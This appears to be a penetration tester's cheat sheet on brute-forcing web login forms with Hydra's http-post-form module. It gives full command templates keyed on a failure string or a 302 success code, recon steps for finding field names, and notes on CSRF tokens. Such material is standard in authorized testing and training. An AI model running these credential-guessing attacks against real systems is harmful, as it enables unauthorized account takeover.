# Login Form Brute-Force (http-post-form)

Recon the form before building the command: browser devtools → inspect HTML for field names and form action path, Network tab → submit garbage creds → confirm POST path and params in the captured request. Burp if it's complex or has hidden fields.

`http-post-form` syntax — three colon-separated segments inside the quotes: `"<path>:<params>:<condition>"`.

Failure condition (most common — use the error string the app returns):

```bash
hydra -L <WORDLIST_U> -P <WORDLIST_P> -f <TARGET> -s <PORT> http-post-form "/<path>:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Success condition (use when failure string is ambiguous — redirect code or keyword on the landing page):

```bash
hydra -L <WORDLIST_U> -P <WORDLIST_P> -f <TARGET> -s <PORT> http-post-form "/<path>:username=^USER^&password=^PASS^:S=302"
```

> [!warning] Get the field names wrong and every attempt silently fails — confirm `name=` attributes from source, not placeholder text or labels.

> [!warning] CSRF tokens in the form = static params string won't work. Capture with Burp, check if token rotates per request — if it does, Hydra alone won't cut it.

If you know the user, drop `-L` for `-l <USER>` to cut the keyspace.